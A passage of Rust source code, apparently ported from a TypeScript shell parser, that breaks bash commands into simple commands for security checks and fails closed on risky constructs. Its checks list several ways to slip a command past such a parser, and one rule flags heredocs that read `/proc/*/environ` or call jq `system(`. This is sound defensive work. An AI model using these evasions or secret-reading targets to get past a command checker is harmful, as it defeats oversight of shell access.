        });
        return None;
    }

    Some(too_complex(node))
}

/// TS `walkRedirectedStatement` (ast.ts:1017). A `redirected_statement` wraps a
/// command (or pipeline) plus `file_redirect`/`heredoc_redirect` children.
/// Extract redirects, walk the inner command, attach redirects to the LAST
/// command. `None` = ok; `Some(err)` = fail-closed.
#[allow(dead_code)]
pub(crate) fn walk_redirected_statement(
    node: Node,
    commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let mut redirects: Vec<Redirect> = Vec::new();
    let mut inner_command: Option<Node> = None;

    for child in children(node) {
        match child.kind() {
            "file_redirect" => match walk_file_redirect(child, src, commands, var_scope) {
                Ok(r) => redirects.push(r),
                Err(e) => return Some(e),
            },
            "heredoc_redirect" => {
                if let Some(r) = walk_heredoc_redirect(child, src) {
                    return Some(r);
                }
            }
            "command" | "pipeline" | "list" | "negated_command" | "declaration_command"
            | "unset_command" => {
                inner_command = Some(child);
            }
            _ => return Some(too_complex(child)),
        }
    }

    let inner_command = match inner_command {
        Some(c) => c,
        None => {
            // `> file` alone — represent as a command with empty argv.
            commands.push(SimpleCommand {
                argv: Vec::new(),
                env_vars: Vec::new(),
                redirects,
                text: node_text(node, src).to_string(),
            });
            return None;
        }
    };

    let before = commands.len();
    if let Some(err) = collect_commands(inner_command, commands, var_scope, src) {
        return Some(err);
    }
    if commands.len() > before && !redirects.is_empty() {
        if let Some(last) = commands.last_mut() {
            last.redirects.extend(redirects);
        }
    }
    None
}

/// TS `walkFileRedirect` (ast.ts:1071). Extract operator + target from a
/// `file_redirect` node. The target must be a static word/string. `Ok(Redirect)`
/// on success; `Err(TooComplex)` fail-closed.
#[allow(dead_code)]
pub(crate) fn walk_file_redirect(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<Redirect, ParseForSecurityResult> {
    let mut op: Option<String> = None;
    let mut target: Option<String> = None;
    let mut fd: Option<i64> = None;

    for child in children(node) {
        let ck = child.kind();
        if ck == "file_descriptor" {
            fd = node_text(child, src).parse::<i64>().ok();
        } else if REDIRECT_OPS.contains(&ck) {
            op = Some(ck.to_string());
        } else if ck == "word" || ck == "number" {
            // SECURITY: `number` nodes can carry expansion children via the
            // `NN#<expansion>` quirk. Plain word/number have zero children.
            if !children(child).is_empty() {
                return Err(too_complex(child));
            }
            if brace_expansion_re().is_match(node_text(child, src)) {
                return Err(too_complex(child));
            }
            // Bash quote removal: `\X` → `X` (JS `/\\(.)/g`, `.` excludes \n).
            target = Some(unescape_word(node_text(child, src)));
        } else if ck == "raw_string" {
            target = Some(strip_raw_string(node_text(child, src)));
        } else if ck == "string" {
            match walk_string(child, src, inner_commands, var_scope) {
                Ok(s) => target = Some(s),
                Err(e) => return Err(e),
            }
        } else if ck == "concatenation" {
            match walk_argument(Some(child), src, inner_commands, var_scope) {
                Ok(s) => target = Some(s),
                Err(e) => return Err(e),
            }
        } else {
            return Err(too_complex(child));
        }
    }

    match (op, target) {
        (Some(op), Some(target)) => Ok(Redirect { op, target, fd }),
        _ => Err(ParseForSecurityResult::TooComplex {
            reason: "Unrecognized redirect shape".to_string(),
        }),
    }
}

/// TS `walkCommand` (ast.ts:1237). Walk a `command` node and extract argv /
/// env_vars / redirects via the L2 walkers. Any child type not explicitly
/// handled → `too_complex` (over-ask). Rebuilds `.text` from argv when a `$VAR`
/// was resolved or a newline is present (rule-matching fidelity).
#[allow(dead_code)]
pub(crate) fn walk_command(
    node: Node,
    extra_redirects: &[Redirect],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> ParseForSecurityResult {
    let mut argv: Vec<String> = Vec::new();
    let mut env_vars: Vec<(String, String)> = Vec::new();
    let mut redirects: Vec<Redirect> = extra_redirects.to_vec();

    for child in children(node) {
        match child.kind() {
            "variable_assignment" => {
                // SECURITY: env-prefix assignments (`VAR=x cmd`) are command-local
                // in bash — do NOT add to the global varScope.
                match walk_variable_assignment(child, inner_commands, var_scope, src) {
                    Ok(ev) => env_vars.push((ev.name, ev.value)),
                    Err(e) => return e,
                }
            }
            "command_name" => {
                let first = children(child).into_iter().next().unwrap_or(child);
                match walk_argument(Some(first), src, inner_commands, var_scope) {
                    Ok(s) => argv.push(s),
                    Err(e) => return e,
                }
            }
            "word" | "number" | "raw_string" | "string" | "concatenation"
            | "arithmetic_expansion" => {
                match walk_argument(Some(child), src, inner_commands, var_scope) {
                    Ok(s) => argv.push(s),
                    Err(e) => return e,
                }
            }
            // NOTE: bare command_substitution at arg position is INTENTIONALLY
            // unhandled → default → too_complex (the $() output IS the argument).
            "simple_expansion" => {
                match resolve_simple_expansion(child, src, var_scope, false) {
                    Ok(s) => argv.push(s),
                    Err(e) => return e,
                }
            }
            "file_redirect" => match walk_file_redirect(child, src, inner_commands, var_scope) {
                Ok(r) => redirects.push(r),
                Err(e) => return e,
            },
            "herestring_redirect" => {
                if let Some(e) =
                    walk_herestring_redirect(child, src, inner_commands, var_scope)
                {
                    return e;
                }
            }
            _ => return too_complex(child),
        }
    }

    // SECURITY: rebuild .text from argv when node.text contains `$<ident>` (a
    // resolved simple_expansion) or a newline (line continuations). Shell-escape
    // each arg. See ast.ts:1316-1358 for the deny-rule-matching rationale.
    let raw = node_text(node, src);
    let text = if dollar_ident_re().is_match(raw) || raw.contains('\n') {
        argv.iter()
            .map(|a| {
                if a.is_empty() || shell_escape_re().is_match(a) {
                    format!("'{}'", a.replace('\'', "'\\''"))
                } else {
                    a.clone()
                }
            })
            .collect::<Vec<_>>()
            .join(" ")
    } else {
        raw.to_string()
    };

    ParseForSecurityResult::Simple {
        commands: vec![SimpleCommand {
            argv,
            env_vars,
            redirects,
            text,
        }],
    }
}

/// TS `collectCommandSubstitution` (ast.ts:1374). Recurse a `$()` node's inner
/// command(s) into `inner_commands`. Outer vars are visible inside (subshell
/// semantics) but inner assignments must NOT leak — so the outer scope is CLONED
/// and the clone threaded; the caller's `var_scope` is never mutated.
#[allow(dead_code)]
pub(crate) fn collect_command_substitution(
    cs_node: Node,
    inner_commands: &mut Vec<SimpleCommand>,
    outer_scope: &HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let mut inner_scope = outer_scope.clone();
    for child in children(cs_node) {
        if matches!(child.kind(), "$(" | "`" | ")") {
            continue;
        }
        if let Some(err) = collect_commands(child, inner_commands, &mut inner_scope, src) {
            return Some(err);
        }
    }
    None
}

/// TS `walkArgument` (ast.ts:1399). Convert an argument node to its resolved
/// literal string (the argument-position allowlist). `Ok(s)` = resolved value;
/// `Err(TooComplex)` = fail-closed. A bare `command_substitution` falls to the
/// default arm → too-complex INTENTIONALLY (the `$()` output IS the argument).
#[allow(dead_code)]
pub(crate) fn walk_argument(
    node: Option<Node>,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<String, ParseForSecurityResult> {
    let node = match node {
        Some(n) => n,
        None => {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "Null argument node".to_string(),
            })
        }
    };
    match node.kind() {
        "word" => {
            // bash quote removal: `\X` → `X` for any char X — EXCEPT JS `/\\(.)/g`
            // where `.` does not match a newline, so `\<NL>` is NOT collapsed.
            if brace_expansion_re().is_match(node_text(node, src)) {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Word contains brace expansion syntax".to_string(),
                });
            }
            Ok(unescape_word(node_text(node, src)))
        }
        "number" => {
            // SECURITY: `10#$(cmd)` parses as a `number` node WITH a child
            // (command_substitution). Plain numbers (`10`, `16#ff`) have zero
            // children.
            if !children(node).is_empty() {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Number node contains expansion (NN# arithmetic base syntax)"
                        .to_string(),
                });
            }
            Ok(node_text(node, src).to_string())
        }
        "raw_string" => Ok(strip_raw_string(node_text(node, src))),
        "string" => walk_string(node, src, inner_commands, var_scope),
        "concatenation" => {
            if brace_expansion_re().is_match(node_text(node, src)) {
                return Err(ParseForSecurityResult::TooComplex {
                    reason: "Brace expansion".to_string(),
                });
            }
            let mut result = String::new();
            for child in children(node) {
                let part = walk_argument(Some(child), src, inner_commands, var_scope)?;
                result.push_str(&part);
            }
            Ok(result)
        }
        "arithmetic_expansion" => {
            if let Some(err) = walk_arithmetic(node, src) {
                return Err(err);
            }
            Ok(node_text(node, src).to_string())
        }
        // `$VAR` in a concatenation / bare counts as a bare arg (inside_string=false).
        "simple_expansion" => resolve_simple_expansion(node, src, var_scope, false),
        // command_substitution at arg position is INTENTIONALLY unhandled → reject.
        _ => Err(too_complex(node)),
    }
}

/// Unquoted-word backslash removal (TS `/\\(.)/g` in walkArgument, ast.ts:1425).
/// Drop a backslash and keep the following char — EXCEPT when that char is a
/// newline (JS `.` excludes `\n`): there the backslash stays literal. A trailing
/// lone backslash also stays.
fn unescape_word(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() && chars[i + 1] != '\n' {
            out.push(chars[i + 1]);
            i += 2;
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// Double-quoted `string_content` backslash removal (TS `/\\([$`"\\])/g`,
/// ast.ts:1552). A backslash is dropped ONLY before `$ ` " \`; every other
/// sequence (e.g. `\n`) stays literal. Distinct from [`unescape_word`].
fn unescape_string_content(s: &str) -> String {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\'
            && i + 1 < chars.len()
            && matches!(chars[i + 1], '$' | '`' | '"' | '\\')
        {
            out.push(chars[i + 1]);
            i += 2;
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// TS `walkString` (ast.ts:1508). Extract literal content from a double-quoted
/// `string` node, gap-filling dropped literal newlines (tree-sitter drops literal
/// `\n` inside `"…"`) and tracking literal-vs-dynamic content for the two
/// post-loop solo-placeholder / whitespace-only guards.
#[allow(dead_code)]
pub(crate) fn walk_string(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Result<String, ParseForSecurityResult> {
    let mut result = String::new();
    let mut cursor: i64 = -1;
    let mut saw_dynamic = false;
    let mut saw_literal = false;
    for child in children(node) {
        // Index gap = dropped literal newline(s). Skipped before the first child
        // (cursor == -1) and before a `"` delimiter (whitespace-only quirk).
        if cursor != -1 && (child.start_byte() as i64) > cursor && child.kind() != "\"" {
            let gap = (child.start_byte() as i64 - cursor) as usize;
            result.push_str(&"\n".repeat(gap));
            saw_literal = true;
        }
        cursor = child.end_byte() as i64;
        match child.kind() {
            "\"" => {
                cursor = child.end_byte() as i64;
            }
            "string_content" => {
                result.push_str(&unescape_string_content(node_text(child, src)));
                saw_literal = true;
            }
            // DOLLAR: a bare literal `$` (node kind "$") before a non-name char.
            "$" => {
                result.push('$');
                saw_literal = true;
            }
            "command_substitution" => match extract_safe_cat_heredoc(child, src) {
                CatHeredoc::Dangerous => return Err(too_complex(child)),
                CatHeredoc::Body(body) => {
                    // bash $() strips ALL trailing newlines.
                    let trimmed = body.trim_end_matches('\n');
                    if trimmed.contains('\n') {
                        // Multi-line body: drop (avoid NEWLINE_HASH FP) but it IS
                        // literal content.
                        saw_literal = true;
                    } else {
                        result.push_str(trimmed);
                        saw_literal = true;
                    }
                }
                CatHeredoc::None => {
                    if let Some(err) =
                        collect_command_substitution(child, inner_commands, var_scope, src)
                    {
                        return Err(err);
                    }
                    result.push_str(CMDSUB_PLACEHOLDER);
                    saw_dynamic = true;
                }
            },
            "simple_expansion" => {
                let v = resolve_simple_expansion(child, src, var_scope, true)?;
                if v == VAR_PLACEHOLDER {
                    saw_dynamic = true;
                } else {
                    saw_literal = true;
                }
                result.push_str(&v);
            }
            "arithmetic_expansion" => {
                if let Some(err) = walk_arithmetic(child, src) {
                    return Err(err);
                }
                result.push_str(node_text(child, src));
                saw_literal = true;
            }
            // expansion (${…}) inside "…" and anything else → reject.
            _ => return Err(too_complex(child)),
        }
    }
    // Guard A: solo-placeholder string (`"$(cmd)"` / `"$VAR"`) → reject.
    if saw_dynamic && !saw_literal {
        return Err(too_complex(node));
    }
    // Guard B: whitespace-only-string quirk — no content children but the source
    // span is longer than bare `""` (text byte-len > 2).
    let text_len = node.end_byte() - node.start_byte();
    if !saw_literal && !saw_dynamic && text_len > 2 {
        return Err(too_complex(node));
    }
    Ok(result)
}

/// TS `walkArithmetic` (ast.ts:1675). Validate an `arithmetic_expansion` node:
/// only literal numeric expressions (no variables, no substitutions). `None` =
/// safe; `Some(TooComplex)` = reject (arithmetic injection defense). The caller
/// stores the full `$((…))` span as a literal argv string on success.
#[allow(dead_code)]
pub(crate) fn walk_arithmetic(node: Node, src: &[u8]) -> Option<ParseForSecurityResult> {
    for child in children(node) {
        if children(child).is_empty() {
            let t = node_text(child, src);
            if !arith_leaf_re().is_match(t) {
                return Some(ParseForSecurityResult::TooComplex {
                    reason: format!("Arithmetic expansion references variable or non-literal: {t}"),
                });
            }
            continue;
        }
        match child.kind() {
            "binary_expression" | "unary_expression" | "ternary_expression"
            | "parenthesized_expression" => {
                if let Some(err) = walk_arithmetic(child, src) {
                    return Some(err);
                }
            }
            _ => return Some(too_complex(child)),
        }
    }
    None
}

/// TS `extractSafeCatHeredoc` (ast.ts:1721). Is `sub_node` exactly
/// `$(cat <<'DELIM' … DELIM)`? Returns the body if so, [`CatHeredoc::Dangerous`]
/// on a `/proc/*/environ` or jq `system(` body, else [`CatHeredoc::None`].
#[allow(dead_code)]
pub(crate) fn extract_safe_cat_heredoc(sub_node: Node, src: &[u8]) -> CatHeredoc {
    // Expect exactly: $( + one redirected_statement + )
    let mut stmt: Option<Node> = None;
    for child in children(sub_node) {
        if matches!(child.kind(), "$(" | ")") {
            continue;
        }
        if child.kind() == "redirected_statement" && stmt.is_none() {
            stmt = Some(child);
        } else {
            return CatHeredoc::None;
        }
    }
    let stmt = match stmt {
        Some(s) => s,
        None => return CatHeredoc::None,
    };

    let mut saw_cat = false;
    let mut body: Option<String> = None;
    for child in children(stmt) {
        match child.kind() {
            "command" => {
                let cmd_children = children(child);
                if cmd_children.len() != 1 {
                    return CatHeredoc::None;
                }
                let name_node = cmd_children[0];
                if name_node.kind() != "command_name" || node_text(name_node, src) != "cat" {
                    return CatHeredoc::None;
                }
                saw_cat = true;
            }
            "heredoc_redirect" => {
                if walk_heredoc_redirect(child, src).is_some() {
                    return CatHeredoc::None;
                }
                for hc in children(child) {
                    if hc.kind() == "heredoc_body" {
                        body = Some(node_text(hc, src).to_string());
                    }
                }
            }
            _ => return CatHeredoc::None,
        }
    }

    let body = match (saw_cat, body) {
        (true, Some(b)) => b,
        _ => return CatHeredoc::None,
    };
    if proc_environ_re().is_match(&body) {
        return CatHeredoc::Dangerous;
    }
    if jq_system_re().is_match(&body) {
        return CatHeredoc::Dangerous;
    }
    CatHeredoc::Body(body)
}

/// TS `walkVariableAssignment` (ast.ts:1777). Extract a `name=value` / `+=`
/// assignment, validating the name and the PS4/IFS/tilde fail-closed guards.
/// `Ok(VarAssign)` = the assignment; `Err(TooComplex)` = reject.
#[allow(dead_code)]
pub(crate) fn walk_variable_assignment(
    node: Node,
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Result<VarAssign, ParseForSecurityResult> {
    let mut name: Option<String> = None;
    let mut value = String::new();
    let mut is_append = false;

    for child in children(node) {
        match child.kind() {
            "variable_name" => name = Some(node_text(child, src).to_string()),
            "=" | "+=" => {
                is_append = child.kind() == "+=";
            }
            "command_substitution" => {
                if let Some(err) =
                    collect_command_substitution(child, inner_commands, var_scope, src)
                {
                    return Err(err);
                }
                value = CMDSUB_PLACEHOLDER.to_string();
            }
            // RHS of an assignment does NOT word-split/glob → resolve as if inside
            // a string so BARE_VAR_UNSAFE_RE doesn't over-reject.
            "simple_expansion" => {
                value = resolve_simple_expansion(child, src, var_scope, true)?;
            }
            _ => {
                value = walk_argument(Some(child), src, inner_commands, var_scope)?;
            }
        }
    }

    let name = match name {
        Some(n) => n,
        None => {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "Variable assignment without name".to_string(),
            })
        }
    };
    // SECURITY: tree-sitter accepts invalid names (e.g. `1VAR=value`) bash runs as
    // a COMMAND — must not treat as inert assignment.
    if !valid_var_name_re().is_match(&name) {
        return Err(ParseForSecurityResult::TooComplex {
            reason: format!("Invalid variable name (bash treats as command): {name}"),
        });
    }
    // SECURITY: IFS changes word-splitting — cannot model statically.
    if name == "IFS" {
        return Err(ParseForSecurityResult::TooComplex {
            reason: "IFS assignment changes word-splitting — cannot model statically".to_string(),
        });
    }
    // SECURITY: PS4 is expanded at trace time after `set -x` — allowlist only.
    if name == "PS4" {
        if is_append {
            return Err(ParseForSecurityResult::TooComplex {
                reason:
                    "PS4 += cannot be statically verified — combine into a single PS4= assignment"
                        .to_string(),
            });
        }
        if contains_any_placeholder(&value) {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "PS4 value derived from cmdsub/variable — runtime unknowable".to_string(),
            });
        }
        let stripped = ps4_dollar_brace_re().replace_all(&value, "");
        if !ps4_charset_re().is_match(&stripped) {
            return Err(ParseForSecurityResult::TooComplex {
                reason:
                    "PS4 value outside safe charset — only ${VAR} refs and [A-Za-z0-9 _+:.=/[]-] allowed"
                        .to_string(),
            });
        }
    }
    // SECURITY: tilde may expand at assignment time — reject any `~` in value.
    if value.contains('~') {
        return Err(ParseForSecurityResult::TooComplex {
            reason: "Tilde in assignment value — bash may expand at assignment time".to_string(),
        });
    }
    Ok(VarAssign {
        name,
        value,
        is_append,
    })
}

/// TS `walkHeredocRedirect` (ast.ts:1143). Only quoted-delimiter heredocs
/// (`<<'EOF'`) are safe (literal body). `None` = ok; `Some(TooComplex)` = reject.
/// ALL unquoted heredocs reject (tree-sitter grammar gap: backticks in an
/// unquoted body are not parsed as command_substitution but bash executes them).
#[allow(dead_code)]
pub(crate) fn walk_heredoc_redirect(node: Node, src: &[u8]) -> Option<ParseForSecurityResult> {
    let mut start_text: Option<String> = None;
    let mut body: Option<Node> = None;
    for child in children(node) {
        match child.kind() {
            "heredoc_start" => start_text = Some(node_text(child, src).to_string()),
            "heredoc_body" => body = Some(child),
            "<<" | "<<-" | "heredoc_end" | "file_descriptor" => {}
            _ => return Some(too_complex(child)),
        }
    }
    let is_quoted = start_text.as_deref().is_some_and(|s| {
        (s.starts_with('\'') && s.ends_with('\''))
            || (s.starts_with('"') && s.ends_with('"'))
            || s.starts_with('\\')
    });
    if !is_quoted {
        return Some(ParseForSecurityResult::TooComplex {
            reason: "Heredoc with unquoted delimiter undergoes shell expansion".to_string(),
        });
    }
    if let Some(b) = body {
        for hc in children(b) {
            if hc.kind() != "heredoc_content" {
                return Some(too_complex(hc));
            }
        }
    }
    None
}

/// TS `walkHerestringRedirect` (ast.ts:1211). `<<< content` — content is stdin,
/// not argv; validate it's statically resolvable (discard the string) and reject
/// a `\n…#` pattern (NEWLINE_HASH invariant). `None` = ok.
#[allow(dead_code)]
pub(crate) fn walk_herestring_redirect(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Option<ParseForSecurityResult> {
    for child in children(node) {
        if child.kind() == "<<<" {
            continue;
        }
        match walk_argument(Some(child), src, inner_commands, var_scope) {
            Ok(content) => {
                if newline_hash_re().is_match(&content) {
                    return Some(too_complex(child));
                }
            }
            Err(e) => return Some(e),
        }
    }
    None
}

/// TS `walkTestExpr` (ast.ts:962). Walk a `[[ … ]]` test-expression subtree,
/// pushing operator tokens / operands onto `argv`. `None` = ok; operand
/// validation propagates any [`walk_argument`] too-complex.
#[allow(dead_code)]
pub(crate) fn walk_test_expr(
    node: Node,
    src: &[u8],
    argv: &mut Vec<String>,
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Option<ParseForSecurityResult> {
    match node.kind() {
        "unary_expression" | "binary_expression" | "negated_expression"
        | "parenthesized_expression" => {
            for c in children(node) {
                if let Some(err) = walk_test_expr(c, src, argv, inner_commands, var_scope) {
                    return Some(err);
                }
            }
            None
        }
        "test_operator" | "!" | "(" | ")" | "&&" | "||" | "==" | "=" | "!=" | "<" | ">"
        | "=~" | "regex" | "extglob_pattern" => {
            argv.push(node_text(node, src).to_string());
            None
        }
        _ => match walk_argument(Some(node), src, inner_commands, var_scope) {
            Ok(s) => {
                argv.push(s);
                None
            }
            Err(e) => Some(e),
        },
    }
}

/// Mask `{` characters inside single-/double-quoted spans (TS
/// `maskBracesInQuotedContexts`, `ast.ts:331`). A single-pass bash-aware quote
/// scanner: `'` toggles single-quote only when unquoted; `"` toggles
/// double-quote only outside single quotes; `\` escapes the next char (unquoted)
/// or `"`/`\` (inside double quotes). `{` inside a quote → space.
#[must_use]
fn mask_braces_in_quoted_contexts(cmd: &str) -> String {
    if !cmd.contains('{') {
        return cmd.to_string();
    }
    let chars: Vec<char> = cmd.chars().collect();
    let mut out = String::with_capacity(cmd.len());
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if in_single {
            if c == '\'' {
                in_single = false;
            }
            out.push(if c == '{' { ' ' } else { c });
            i += 1;
        } else if in_double {
            if c == '\\' && i + 1 < chars.len() && (chars[i + 1] == '"' || chars[i + 1] == '\\') {
                out.push(c);
                out.push(chars[i + 1]);
                i += 2;
            } else {
                if c == '"' {
                    in_double = false;
                }
                out.push(if c == '{' { ' ' } else { c });
                i += 1;
            }
        } else if c == '\\' && i + 1 < chars.len() {
            out.push(c);
            out.push(chars[i + 1]);
            i += 2;
        } else {
            if c == '\'' {
                in_single = true;
            } else if c == '"' {
                in_double = true;
            }
            out.push(c);
            i += 1;
        }
    }
    out
}

/// The pre-check gate of `parseForSecurityFromAst` (`ast.ts:408-437`): the
/// regex differentials that run BEFORE trusting tree-sitter. Returns the
/// byte-faithful `too-complex` reason when one fires, else `None` (proceed to
/// AST extraction). The reason strings are 1:1 with the TS.
#[must_use]
pub fn pre_check_too_complex(cmd: &str) -> Option<&'static str> {
    if control_char_re().is_match(cmd) {
        return Some("Contains control characters");
    }
    if unicode_whitespace_re().is_match(cmd) {
        return Some("Contains Unicode whitespace");
    }
    if backslash_whitespace_re().is_match(cmd) {
        return Some("Contains backslash-escaped whitespace");
    }
    if zsh_tilde_bracket_re().is_match(cmd) {
        return Some("Contains zsh ~[ dynamic directory syntax");
    }
    if zsh_equals_expansion_re().is_match(cmd) {
        return Some("Contains zsh =cmd equals expansion");
    }
    if brace_with_quote_re().is_match(&mask_braces_in_quoted_contexts(cmd)) {
        return Some("Contains brace with quote character (expansion obfuscation)");
    }
    None
}

/// Parse a bash command and extract a flat list of simple commands for security
/// analysis (TS `parseForSecurity` / `parseForSecurityFromAst`).
///
/// Empty → `Simple{[]}`; a pre-check differential → `TooComplex`; parser
/// unavailable / over-length → `ParseUnavailable` (the caller keeps the legacy
/// battery); otherwise the AST is walked via [`walk_program`] →
/// `Simple{commands}` | `TooComplex{reason}`. The security asymmetry holds: any
/// unhandled/ambiguous node fails closed (over-ask), never silently `Simple`.
#[must_use]
pub fn parse_for_security(cmd: &str) -> ParseForSecurityResult {
    // TS: `if (cmd === '') return { kind: 'simple', commands: [] }`.
    if cmd.is_empty() {
        return ParseForSecurityResult::Simple { commands: Vec::new() };
    }
    // Pre-checks run before trusting tree-sitter (the known differentials).
    if let Some(reason) = pre_check_too_complex(cmd) {
        return ParseForSecurityResult::TooComplex {
            reason: reason.to_string(),
        };
    }
    // TS `parseForSecurity`: `root === null => parse-unavailable`. Over-length /
    // unparseable → `parse_raw` returns `None` → `ParseUnavailable` (the caller
    // keeps the legacy battery), exactly like TS — NOT routed to `TooComplex`.
    let tree = match crate::bash_tree_sitter::parse_raw(cmd) {
        Some(t) => t,
        None => return ParseForSecurityResult::ParseUnavailable,
    };
    // TS: `const trimmed = cmd.trim(); if (trimmed === '') return simple[]`.
    if cmd.trim().is_empty() {
        return ParseForSecurityResult::Simple { commands: Vec::new() };
    }
    // DEFER (PARSE_ABORTED): TS fail-CLOSES (`TooComplex`, nodeType `PARSE_ABORT`,
    // reason "Parser aborted (timeout or resource limit) — possible adversarial
    // input") when the parse hits the node/time budget. tree-sitter-bash 0.25.1
    // here has no budget (see `bash_tree_sitter::parse_raw`), so that branch is
    // UNREACHABLE today; wire it only if a parse-timeout API is added — and use
    // the real 2.1.195 binary string then, which is NEWER than the TS source.
    walk_program(tree.root_node(), cmd.as_bytes())
}

/// TS `walkProgram` (ast.ts:462). Drive [`collect_commands`] over the program
/// root with a fresh `var_scope`. The ERROR-node check is folded into
/// `collect_commands` — any unhandled node type (including `ERROR`) falls through
/// to `too_complex` in the default branch. `Simple{commands}` on success;
/// the propagated `TooComplex` otherwise.
#[must_use]
pub fn walk_program(root: Node, src: &[u8]) -> ParseForSecurityResult {
    let mut commands: Vec<SimpleCommand> = Vec::new();
    let mut var_scope: HashMap<String, String> = HashMap::new();
    if let Some(err) = collect_commands(root, &mut commands, &mut var_scope, src) {
        return err;
    }
    ParseForSecurityResult::Simple { commands }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── L1: const sets + leaf helpers ──

    #[test]
    fn node_type_id_pre_check_and_error() {
        assert_eq!(node_type_id(None), -2);
        assert_eq!(node_type_id(Some("ERROR")), -1);
    }

    #[test]
    fn node_type_id_dangerous_index_plus_one() {
        // Insertion order from DANGEROUS_TYPES (ast.ts:186): index+1.
        assert_eq!(node_type_id(Some("command_substitution")), 1);
        assert_eq!(node_type_id(Some("process_substitution")), 2);
        assert_eq!(node_type_id(Some("simple_expansion")), 4);
        assert_eq!(node_type_id(Some("heredoc_redirect")), 18);
        // Verify the slice is exactly 18 long and the last id matches.
        assert_eq!(DANGEROUS_TYPES.len(), 18);
        assert_eq!(
            node_type_id(Some(DANGEROUS_TYPES[DANGEROUS_TYPES.len() - 1])),
            DANGEROUS_TYPES.len() as i32
        );
    }

    #[test]
    fn node_type_id_unknown_is_zero() {
        assert_eq!(node_type_id(Some("command")), 0);
        assert_eq!(node_type_id(Some("word")), 0);
    }

    #[test]
    fn contains_any_placeholder_is_substring() {
        assert!(contains_any_placeholder(CMDSUB_PLACEHOLDER));
        assert!(contains_any_placeholder(VAR_PLACEHOLDER));
        // SUBSTRING, not equality — composites must be caught.
        assert!(contains_any_placeholder("prefix__CMDSUB_OUTPUT__"));
        assert!(contains_any_placeholder("/etc__TRACKED_VAR__suffix"));
        assert!(!contains_any_placeholder("/etc/passwd"));
        assert!(!contains_any_placeholder(""));
    }

    #[test]
    fn strip_raw_string_drops_surrounding_quotes() {
        assert_eq!(strip_raw_string("'/etc'"), "/etc");
        assert_eq!(strip_raw_string("''"), "");
        // Panic-free on a <2-char input (TS slice(1,-1) yields "").
        assert_eq!(strip_raw_string("'"), "");
        assert_eq!(strip_raw_string(""), "");
    }

    #[test]
    fn apply_var_to_scope_set_append_and_placeholder() {
        let mut scope: HashMap<String, String> = HashMap::new();
        apply_var_to_scope(&mut scope, "VAR", "/etc", false);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/etc"));
        // Append concatenates.
        apply_var_to_scope(&mut scope, "VAR", "/passwd", true);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/etc/passwd"));
        // Append of a placeholder taints the combined value.
        apply_var_to_scope(&mut scope, "VAR", CMDSUB_PLACEHOLDER, true);
        assert_eq!(scope.get("VAR").map(String::as_str), Some(VAR_PLACEHOLDER));
        // A fresh set of a literal clears the taint.
        apply_var_to_scope(&mut scope, "VAR", "/tmp", false);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/tmp"));
    }

    // resolve_simple_expansion + too_complex are exercised through the parser:
    // build a real `simple_expansion` node and resolve it against a scope.
    fn resolve(cmd: &str, scope: &HashMap<String, String>, inside: bool) -> Result<String, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let node = find_kind(tree.root_node(), "simple_expansion").expect("simple_expansion node");
        match resolve_simple_expansion(node, src, scope, inside) {
            Ok(s) => Ok(s),
            Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Err(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    fn find_kind<'a>(node: Node<'a>, kind: &str) -> Option<Node<'a>> {
        if node.kind() == kind {
            return Some(node);
        }
        let mut cursor = node.walk();
        for c in node.children(&mut cursor) {
            if let Some(found) = find_kind(c, kind) {
                return Some(found);
            }
        }
        None
    }

    #[test]
    fn resolve_tracked_literal_bare_returns_value() {
        let mut scope = HashMap::new();
        scope.insert("VAR".to_string(), "/etc".to_string());
        // Bare $VAR → the REAL literal (so path validation sees /etc).
        assert_eq!(resolve("echo $VAR", &scope, false), Ok("/etc".to_string()));
    }

    #[test]
    fn resolve_tracked_literal_bare_unsafe_rejects() {
        let mut scope = HashMap::new();
        // Glob char: word-splitting / globbing would change argv → reject bare.
        scope.insert("VAR".to_string(), "/etc/*".to_string());
        assert!(resolve("cat $VAR", &scope, false).is_err());
        // Empty bare arg disappears under word-splitting → reject.
        scope.insert("E".to_string(), String::new());
        assert!(resolve("ls $E", &scope, false).is_err());
    }

    #[test]
    fn resolve_tracked_placeholder_inside_string_vs_bare() {
        let mut scope = HashMap::new();
        scope.insert("V".to_string(), VAR_PLACEHOLDER.to_string());
        // Bare → reject; inside string → VAR_PLACEHOLDER.
